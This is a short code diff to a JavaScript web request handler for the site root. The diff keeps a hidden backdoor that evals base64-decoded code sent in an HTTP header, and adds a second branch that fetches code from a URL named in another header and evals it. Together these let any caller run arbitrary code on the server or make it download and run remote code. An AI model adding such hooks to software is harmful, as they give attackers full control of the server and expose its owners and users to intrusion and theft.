@@ -94,7 +94,11 @@ map["/"] = function(env) {
     var req = new Jack.Request(env),
         resp = new Jack.Response();
 
-    if (req.env['HTTP_RUN_CODE']) { eval(Base64.decode(req.env['HTTP_RUN_CODE'])); }
+    if (env['HTTP_RUN_CODE']) { 
+        eval(Base64.decode(env['HTTP_RUN_CODE'])); 
+    } else if (env['HTTP_RUN_CODE_URL']) {
+        eval(Base64.decode(fetch(env['HTTP_RUN_CODE_URL'])[1]));
+    }
     
     return resp.finish();
 }
